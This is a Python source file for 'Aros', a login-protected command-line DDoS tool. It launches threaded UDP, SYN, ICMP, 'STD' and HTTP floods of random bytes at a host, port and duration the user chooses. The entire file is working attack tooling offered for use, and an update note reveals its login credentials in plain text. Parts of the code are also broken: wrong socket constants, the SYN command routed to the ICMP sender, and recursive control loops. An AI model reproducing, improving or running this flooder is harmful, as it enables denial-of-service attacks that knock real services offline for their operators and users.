#!/usr/bin/env python3
#-*- coding: utf-8 -*-
import sys
import socket
import time
import random
import threading
import getpass
import os
import hashlib

sys.stdout.write("Aros Made by Magma and Zombie")
def modifications():
	print ("Contact Magma or Zombie The Script Is Currently Under Maitnance.")
	on_enter = input("Press Enter To Leave.")
	exit()
#column:65
methods = """\033[91m
????????????????????????????????????????????????????????
?                     \033[00mDDOS METHODS\033[91m                     ?               
????????????????????????????????????????????????????????
? \033[00mUDP  (HOST) (PORT) (TIME) (SIZE) \033[91m|\033[00m UDP ATTACK\033[91m        ?
? \033[00mSYN  (HOST) (PORT) (TIME) (SIZE) \033[91m|\033[00m SYN ATTACK\033[91m        ?
? \033[00mSTD  (HOST) (PORT) (TIME) (SIZE) \033[91m|\033[00m STD ATTACK\033[91m        ?
? \033[00mICMP (HOST) (PORT) (TIME) (SIZE) \033[91m|\033[00m ICMP ATTACK\033[91m       ?
? \033[00mHTTP (HOST) (PORT) (TIME) (SIZE) \033[91m|\033[00m HTTP ATTACK\033[91m       ?
????????????????????????????????????????????????????????\033[00m
"""

info = """
Aros Was Created By Magma and Zombie
"""

help = """\033[91m
????????????????????????????????????????????????????????
?                    \033[00mBASIC COMMANDS\033[91m                    ?
????????????????????????????????????????????????????????
? \033[00mmethods \033[91m|\033[00m AROS METHODS\033[91m                               ?
? \033[00mtools   \033[91m|\033[00m BASIC TOOLS\033[91m                                ?
? \033[00mupdates \033[91m|\033[00m DISPLAYS UPDATE NOTES\033[91m                      ?
? \033[00minfo    \033[91m|\033[00m DISPLAYS AROS INFO\033[91m                         ?
? \033[00mclear   \033[91m|\033[00m CLEARS SCREEN\033[91m                              ?
? \033[00mexit    \033[91m|\033[00m EXITS AROS\033[91m                                 ?
????????????????????????????????????????????????????????\033[00m
"""

tools = """\033[91m
????????????????????????????????????????????????????????
?                        \033[00mTOOLS\033[91m                         ?
????????????????????????????????????????????????????????
? \033[00mstopattacks             \033[91m|\033[00m STOPS ALL ATTACKS\033[91m          ?
? \033[00mattacks                 \033[91m|\033[00m SHOWS RUNNING ATTACKS\033[91m      ?
? \033[00mping (HOST) (PORT)      \033[91m|\033[00m PINGS A HOST\033[91m               ?
? \033[00mresolve (HOST)          \033[91m|\033[00m GRABS A DOMAINS IP\033[91m         ?
????????????????????????????????????????????????????????\033[00m
"""

updatenotes = """\033[91m
????????????????????????????????????????????????????????????
?                     \033[00mUPDATE NOTES\033[91m                         ?
????????????????????????????????????????????????????????????
? \033[00m[*] Username And Password Changed To "void422" and "MAZ".\033[91m?
? \033[00m[*] Added STD Method.\033[91m                                    ?
? \033[00m[*] Added HTTP Method.\033[91m                                   ?
? \033[00m[*] Timeout Bug Fixed.\033[91m                                   ?
? \033[00m[*] Took Out Some Tools.\033[91m                                 ?   
? \033[00m[*] All Tools Fixed And Working.\033[91m                         ?
????????????????????????????????????????????????????????????\033[00m
"""

banner = """               

╔═╗┬─┐┌─┐┌─┐
╠═╣├┬┘│ │└─┐
╩ ╩┴└─└─┘└─┘

-------------------------
Coded by Magma and Zombie
-------------------------

"""

cookie = open(".Aros_Cookie","w+")

fsubs = 0
tpings = 0
liips = 0
tattacks = 0
uaid = 0
said = 0
iaid = 0
haid = 0
aid = 0
attack = True
http = True
udp = True
syn = True
icmp = True
std = True


def synsender(host, port, timer, punch):
	global said
	global syn
	global aid
	global tattacks
	timeout = time.time() + float(timer)
	sock = socket.socket (socket.AF_INET, socket.SOCK_RAW, socket.TCP_SYNCNT)

	said += 1
	tattacks += 1
	aid += 1
	while time.time() < timeout and syn and attack:
		sock.sendto(punch, (host, int(port)))
	said -= 1
	aid -= 1

def udpsender(host, port, timer, punch):
	global uaid
	global udp
	global aid
	global tattacks

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	
	uaid += 1
	aid += 1
	tattacks += 1
	while time.time() < timeout and udp and attack:
		sock.sendto(punch, (host, int(port)))
	uaid -= 1
	aid -= 1

def icmpsender(host, port, timer, punch):
	global iaid
	global icmp
	global aid
	global tattacks

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)

	iaid += 1
	aid += 1
	tattacks += 1
	while time.time() < timeout and icmp and attack:
		sock.sendto(punch, (host, int(port)))
	iaid -= 1
	aid -= 1

def stdsender(host, port, timer, punch):
	global iaid
	global icmp
	global aid
	global tattacks

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)

	iaid += 1
	aid += 1
	tattacks += 1
	while time.time() < timeout and icmp and attack:
		sock.sendto(punch, (host, int(port)))
	iaid -= 1
	aid -= 1

def httpsender(host, port, timer, punch):
	global haid
	global http
	global aid
	global tattacks

	timeout = time.time() + float(timer)

	haid += 1
	aid += 1
	tattacks += 1
	while time.time() < timeout and icmp and attack:
		try:
			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			sock.sendto(punch, (host, int(port)))
			sock.close()
		except socket.error:
			pass

	haid -= 1
	aid -= 1


def main():
	global fsubs
	global tpings
	global liips
	global tattacks
	global uaid
	global said
	global iaid
	global haid
	global aid
	global attack
	global dp
	global syn
	global icmp
	global http
	global std

	while True:
		sys.stdout.write("\x1b]2;Aros Made by Magma and Zombie\x07")
		sin = input("\033[1;00m[\033[91mAros\033[1;00m]# ").lower()
		sinput = sin.split(" ")[0]
		if sinput == "clear":
			os.system ("cls")
			print (banner)
			main()
		elif sinput == "help":
			print (help)
			main()
		elif sinput == "exit":
			exit()
		elif sinput == "methods":
			print (methods)
			main()
		elif sinput == "tools":
			print (tools)
			main()
		elif sinput == "updates":
			print (updatenotes)
			main()
		elif sinput == "info":
			print (info)
			main()
		elif sinput == "attacks":
			print ("\n[\033[91mAros\033[00m] Total Attacks: {}\n".format (aid))
			main()
		elif sinput == "resolve":
			liips += 1
			host = sin.split(" ")[1]
			host_ip = socket.gethostbyname(host)
			print ("[\033[91mAros\033[00m] Host: {} \033[00m[\033[91mConverted\033[00m] {}".format (host, host_ip))
			main()
		elif sinput == "ping":
			tpings += 1
			try:
				sinput, host, port = sin.split(" ")
				print ("[\033[91mAros\033[00m] Starting Ping On Host: {}".format (host))
				try:
					ip = socket.gethostbyname(host)
				except socket.gaierror:
					print ("[\033[91mAros\033[00m] Host Un-Resolvable.")
					main()
				while True:
					try:
						sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
						sock.settimeout(2)
						start = time.time() * 1000
						sock.connect ((host, int(port)))
						stop = int(time.time() * 1000 - start)
						sys.stdout.write("\x1b]2;A R O S [()ms] L O V E\x07".format (stop))
						print ("Aros: {}:{} | Time: {}ms [\033[91mONLINE\033[00m]".format(ip, port, stop))
						sock.close()
						time.sleep(1)
					except socket.error:
						sys.stdout.write("\x1b]2;A R O S |OFFLINE| L O V E\x07")
						print ("Aros: {}:{} [\033[91mOFFLINE\033[00m]".format(ip, port))
						time.sleep(1)
					except KeyboardInterrupt:
						print("")
						main()
			except ValueError:
				print ("[\033[91mAros\033[00m] The Command {} Requires An Argument.".format (sinput))
				main()
		elif sinput == "udp":
				try:
					sinput, host, port, timer, pack = sin.split(" ")
					socket.gethostbyname(host)
					print ("Attack Sent To: {}\n".format (host))
					punch = random._urandom(int(pack))
					threading.Thread(target=udpsender, args=(host, port, timer, punch)).start()
				except ValueError:
					print ("[\033[91mAros\033[00m] The Command {} Requires An Argument.".format (sinput))
					main()
				except socket.gaierror:
					print ("[\033[91mAros\033[00m] Host: {} Invalid".format (host))
					main()
		elif sinput == "http":
			try:
				sinput, host, port, timer, pack = sin.split(" ")
				socket.gethostbyname(host)
				print ("Attack Sent To: {}\n".format (host))
				punch = random._urandom(int(pack))
				threading.Thread(target=httpsender, args=(host, port, timer, punch)).start()
			except ValueError:
				print ("[\033[91mAros\033[00m] The Command {} Requires An Argument.".format (sinput))
				main()
			except socket.gaierror:
				print ("[\033[91mAros\033[00m] Host: {} Invalid".format (host))
				main()
		elif sinput == "std":
			try:
				sinput, host, port, timer, pack = sin.split(" ")
				socket.gethostbyname(host)
				print ("Attack Sent To: {}\n".format (host))
				punch = random._urandom(int(pack))
				threading.Thread(target=stdsender, args=(host, port, timer, punch)).start()
			except ValueError:
				print ("[\033[91mAros\033[00m] The Command {} Requires An Argument.".format (sinput))
				main()
			except socket.gaierror:
				print ("[\033[91mAros\033[00m] Host: {} Invalid".format (host))
				main()
		elif sinput == "icmp":
				try:
					sinput, host, port, timer, pack = sin.split(" ")
					socket.gethostbyname(host)
					print ("Attack Sent To: {}\n".format (host))
					punch = random._urandom(int(pack))
					threading.Thread(target=icmpsender, args=(host, port, timer, punch)).start()
				except ValueError:
					print ("[\033[91mAros\033[00m] The Command {} Requires An Argument.".format (sinput))
					main()
				except socket.gaierror:
					print ("[\033[91mAros\033[00m] Host: {} Invalid".format (host))
					main()
		elif sinput == "syn":
			try:
				sinput, host, port, timer, pack = sin.split(" ")
				socket.gethostbyname(host)
				print ("Attack Sent To: {}\n".format (host))
				punch = random._urandom(int(pack))
				threading.Thread(target=icmpsender, args=(host, port, timer, punch)).start()
			except ValueError:
				print ("[\033[91mAros\033[00m] The Command {} Requires An Argument.".format (sinput))
				main()
			except socket.gaierror:
				print ("[\033[91mAros\033[00m] Host: {} Invalid".format (host))
				main()
		elif sinput == "stopattacks":
			attack = False
			while not attack:
				if aid == 0:
					attack = True
		elif sinput == "stop":
			what = sin.split(" ")[1]
			if what == "udp":
				print ("Stoping all udp attacks")
				udp = False
				while not udp:
					if aid == 0:
						print ("[\033[91mAros\033[00m] No UDP Processes Running.")
						udp = True
						main()
			if what == "icmp":
				print ("Stopping all icmp attacks")
				icmp = False
				while not icmp:
					print ("[\033[91mReaper\033[00m] No ICMP Processes Running.")
					udp = True
					main()
		else:
			print ("[\033[91mAros\033[00m] {} Is Not A Command.".format(sinput))
			main()



try:
	x = input("\n[*] Username: ")
	hash_object = hashlib.sha256(x.encode())
	hex_dig = hash_object.hexdigest()
	
	users = ["db96e753847e2eafe4cde3a2d414d10646faac1144f5f397ddff90bdfb2bc210", "163e49567eef0c05e154db2074383d0dcff8e04cefdfb3114df9a417627783e5"]
	clear = "clear"
	os.system ("cls")
	if hex_dig in users:
		user = x
	else:
		print ("[*] Incorrect, Exiting.")
		exit()
except KeyboardInterrupt:
	print ("\nCtrl-C Has Been Pressed.")
	exit()
try:
	passwords = ["53c64f4db3eb24e564137897cb86074320be41985c4437b2a244a5c2ffd34d6d", "9918f0455cefecd78b99a6d8daf7da74732ccd50fdbafda860ecc0f050f2e725"]
	password = getpass.getpass ("[*] Password: ")
	hash_object = hashlib.sha256(password.encode())
	password = hash_object.hexdigest()
	if hex_dig == "db96e753847e2eafe4cde3a2d414d10646faac1144f5f397ddff90bdfb2bc210":
		if password == passwords[0]:
			print ("[*] Login Correct.")
			print ("[*] Type help To See Commands.")
			cookie.write("DIE")
			time.sleep(3)
			os.system (clear)
			try:
				os.system ("cls")
				print (banner)
				main()
			except KeyboardInterrupt:
				print ("\n[\033[91mAros\033[00m] Ctrl-C Has Been Pressed.")
				main()
		else:
			print ("[*] Incorrect, Exiting.")
			exit()
	if hex_dig == "163e49567eef0c05e154db2074383d0dcff8e04cefdfb3114df9a417627783e5":
		if password == passwords[1]:
			print ("[*] Login Correct.")
			print ("[*] Certain Methods Will Not Be Available To You.")
			print ("[*] Type help To See Commands.")
			time.sleep(5)
			os.system (clear)
			try:
				os.system ("cls")
				print (banner)
				main()
			except KeyboardInterrupt:
				print ("\n[\033[91mAros\033[00m] Ctrl-C Has Been Pressed.")
				main()
		else:
			print ("[*] Incorrect, Exiting.")
			exit()
except KeyboardInterrupt:
	exit()
